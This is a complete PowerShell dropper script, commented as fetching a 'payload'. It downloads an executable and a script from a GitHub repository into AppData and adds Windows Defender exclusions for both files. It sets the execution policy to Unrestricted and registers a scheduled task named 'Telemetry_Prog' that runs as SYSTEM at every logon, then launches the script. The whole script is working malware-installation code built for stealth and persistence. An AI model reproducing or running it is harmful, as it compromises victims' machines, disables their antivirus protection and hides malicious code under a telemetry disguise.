# fetch payload from github
Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"
Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/Windows_telemetry.ps1' -OutFile "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"
# add exlusion to both files
Add-MpPreference -ExclusionPath "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"
Add-MpPreference -ExclusionPath "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"
# set execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
# add schedule to start Windows_telemetry.ps1
# add variables for scheduler
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
# start process
& "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"
